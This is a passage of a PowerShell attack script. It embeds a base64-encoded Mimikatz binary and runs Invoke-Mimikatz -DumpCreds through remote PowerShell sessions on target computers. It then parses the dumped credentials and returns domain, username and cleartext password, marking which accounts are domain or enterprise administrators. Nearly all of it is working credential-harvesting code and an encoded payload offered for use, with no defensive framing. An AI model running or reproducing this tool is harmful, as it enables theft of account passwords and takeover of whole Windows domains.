E9iT2SPZo9pz2wPek9Jz4wPjs+ej6DPqM+ED8YPx4/LD82P0E/rz8A8AAAQAEAAAAwDzA1MFgwgzCaMKkwsjDEMM0w3zDoMP0wBjEXMSAxPjFKMVwxZTGDMY8xoTGqMccx0zHsMfUxADIJMiUyLjI5MkIyTTJWMmEyajLiMlczozOsM+4z9zP+MwM0FDQjNLA0yTTtNPw0FDVTNd41CTYRNhc2JDZoNrY2TTduN4w30jfbN+I35zf4Nwg4bTiVOKc47Dj1OPw4ATkSOSE5nDnaOeE55znuOfM5BDoROho6QTplOn06jDqSOpg6njqkOqo6sDq2Orw6wjrIOs461DraOuA65jrsOvI6+Dr+OgQ7CjsQOxY7HDsiOyg7Ljs0Ozo7QDtGO0w7UjtYO147ZDtqO3A7djt8O4I7iDuOO5Q7mjugO6Y7rDuyO7g7vjvOO0w8WDx2PHw8oTzjPCI9Zz2ePfk9BT4RPwAAAQDAAAAAKDAwMEgwDTETMRgxOTFBMUcxTTFzMXwxjTGlMboxvzHFMd0x4jHuMf4xBDILMiIyKDI1MkUyWjJkMn8yhTKMMpcyoTKyMssy1TLxMv4yJjSjNK00AjUtNTM1OTU/NUU1SzVSNVk1YDVnNW41dTV8NYQ1jDWUNaA1qTWuNbQ1vjXHNdI14DXlNes19jX9Nag2rjaCN6c36TcnOFg4lji7ON04DTlEOZ05CTohOkU6QDx7PZQ+cj8AAAAQAQBEAAAA3zGMM7sz0zMMNBA0FDQYNBw0IDQkNCg0UDQRNYo1szUMNnw2lDa4NsQ58zleOns6Hjv5O1g+bj+JPwAAACABAFQAAAAgMHswfzCDMIcwizCPMJMwlzDAMLAx7DH5MSsygDKZMqAzsDO+Mz40iDSVNH01vDURNjc2gjY9N1Q64zrpOvo6nDs+PRI+Jj5IPgAAADABAGwAAAAjMZ8xsDLuMlk0njTQNAk1YzVsNRc2JTaCNog2jjaZNrY2AzcINx83QjdPN1s3YzdrN3c3iTeWN543AzhWOGQ4lDiuOIE5dzp/OjI7FDytPLM8VT1bPWs9Cz4iPsU+uz/DPwAAAEABAGQAAAB2MFgx8TH3MZkynzKvMk8zZjOWM2Q1yzVZOHA4uzu/O8M7xzvLO8870zvXO9s73zvjO+c79DtmPGE9cj2OPc095D3vPT4+WT5uPoE+pj7iPv4+GT9YP6A/rj/mPwBQAQAkAAAAHTA4MFcwajB3MCQxOzGOMZwx1THvMU4yVDIAAABgAQDwAgAAnDPgM+QzKDUsNTA1ODVANUQ1SDVMNaA2pDaoNqw2tDa4Nrw2CDcMNxA3FDcYNxw3IDckNyg3LDcwNzQ3ODc8N0A3RDdIN0w3UDdUN1g3XDdgN2Q3aDdsN3A3dDd4N3w3gDeEN4g3jDeQN5Q3mDecN6A3pDeoN6w3sDe0N7g3vDfAN8Q3yDfMN9A31DfYN9w34DfsN/A39Df0OPg4/DgAOQQ5CDkMORA5FDkYORw5IDkkOSg5LDkwOTQ5ODk8OUA5RDlIOUw5YDl4OZA5qDmsOcA5xDnYOdw54DnkOeg57DnwOfw5CDoMOhA6FDoYOhw6IDokOig6LDowOjQ6ODo8Okg6VDpYOlw6ZDpwOnQ6eDp8OoA6hDqIOow6kDqUOpg6nDqgOqQ6qDqsOrA6tDq4Orw6wDrEOsg61DrgOuQ66DrsOvA69Dr4Ovw6ADsEOwg7DDsQOxQ7GDscOyA7JDsoOyw7MDs0Ozg7PDtAO0Q7SDtMO1A7VDtYO1w7YDtkO2g7bDtwO3Q7eDt8O4A7jDuYO5w7oDukO6g7tDvAO8Q7yDvMO9A71DvYO9w74DvkO+g79DsAPAQ8CDwMPBA8FDwYPBw8IDwkPCg8LDwwPDQ8ODw8PEA8SDxMPFg8XDxgPGQ8aDxsPHA8dDx4PHw8gDyEPIg8jDyQPJQ8mDykPDg9QD1EPUg9UD1UPWA9ZD1wPXQ9eD2APYQ9iD2QPZQ9mD2gPaQ9sD20PcA9xD3QPdQ94D3kPfA99D0APgQ+ED4UPiA+JD4wPjQ+OD48PkA+RD5IPkw+UD5UPmA+cD50Png+fD6APoQ+iD6MPpA+lD6YPpw+oD6kPqg+rD6wPrQ+uD68Psg+zD7QPtg+4D7oPvA++D4APwg/ED8YPxw/ID8kPyg/LD8wPzQ/OD88P0A/RD9IP0w/UD9UP1g/XD9gP2Q/aD9sP3A/dD94P4A/iD+QP5g/oD+oP7A/uD/AP8g/0D/YP+A/6D/wP/g/AHABAFQAAAAAMCAwJDAoMCwwMDA0MDgwPDBAMEQwSDBMMFAwVDBYMFwwYDBkMGgwbDBwMHQweDB8MIAwhDCIMIwwkDCUMJgwnDCgMKQwrDCwMLQwADACABgAAADYP+A/5D/sP/A/+D/8PwAAAEACACAAAAAEMAgwEDAUMBwwIDAoMCwwNDA4MFQwWDAAYAIA/AAAABAwFDAwMDAzNDM8M3QzeDOAM6gz5DMgNFw0nDSgNKg00DQMNVA1hDWINZA1sDW0Nbw17DUgNiQ2LDZwNqw26DYkN1g3XDdgN2Q3cDeoN+Q3IDhUOGA4gDiEOIw44DgcOVg5lDnQOQQ6CDoMOhA6FDoYOhw6IDokOig6LDowOjQ6ODqIOow60DrYOgw7FDtIO1A7hDuMOxA8GDxMPFQ8iDyQPMQ8zDz4PPw8AD0EPQg9DD0QPSg9MD1cPWA9ZD1oPWw9cD10PXg9fD2APYQ9iD2MPZA9qD2wPeQ97D1wPng+rD60Pug+8D4kPyw/YD9oP8g/0D8AcAIAXAAAAAQwDDBAMEgwgDC8MPgwSDFQMYQxjDG8Megx7DHwMfQx+DH8MQAyBDIIMgwyEDIUMhgyHDIgMiQyKDIsMjAyNDI4MjwyQDJEMkgyTDJQMlQyWDJcMgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="

    if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
    {
        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, "Void", 0, "", $ExeArgs)
    }
    else
    {
        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, "Void", 0, "", $ExeArgs) -ComputerName $ComputerName
    }
}

Main
}
Invoke-Mimikatz -DumpCreds
'@
                $MimikatzOutput = Invoke-Command -Session $x -ScriptBlock {Invoke-Expression -Command  "$args"} -ArgumentList $HostedScript                
                $TblResults = Parse-Mimikatz -raw $MimikatzOutput
                $TblResults | foreach {
            
                    [string]$pwtype = $_.pwtype.ToLower()
                    [string]$pwdomain = $_.domain.ToLower()
                    [string]$pwusername = $_.username.ToLower()
                    [string]$pwpassword = $_.password
                    
                    # Check if user has da/ea privs - requires autotarget
                    if ($AutoTarget)
                    {
                        $ea = "No"
                        $da = "No"

                        # Check if user is enterprise admin                   
                        $EnterpriseAdmins |
                        ForEach-Object {
                            $EaUser = $_.GroupMember
                            if ($EaUser -eq $pwusername){
                                $ea = "Yes"
                            }
                        }
                    
                        # Check if user is domain admin
                        $DomainAdmins |
                        ForEach-Object {
                            $DaUser = $_.GroupMember
                            if ($DaUser -eq $pwusername){
                                $da = "Yes"
                            }
                        }
                    }else{
                        $ea = "Unknown"
                        $da = "Unknown"
                    }

                    # Add credential to list
                    $TblPasswordList.Rows.Add($PWtype,$pwdomain,$pwusername,$pwpassword,$ea,$da) | Out-Null
                }            

                # remove sessions
                Write-verbose "Removing ps sessions..."
                Disconnect-PSSession -Session $x | Out-Null
                Remove-PSSession -Session $x | Out-Null

            }else{
                Write-verbose "No ps sessions could be created."
            }                 
        }

        # Clean and results
        End
        {
                # Clear server list
                $TblServers.Clear()

                # Return passwords
                if ($TblPasswordList.row.count -eq 0){
                    Write-Verbose "No credentials were recovered."
                    Write-Verbose "Done."
                }else{
                    $TblPasswordList | select domain,username,password,EnterpriseAdmin,DomainAdmin -Unique | Sort-Object username,password,domain
                }                
        }
    }
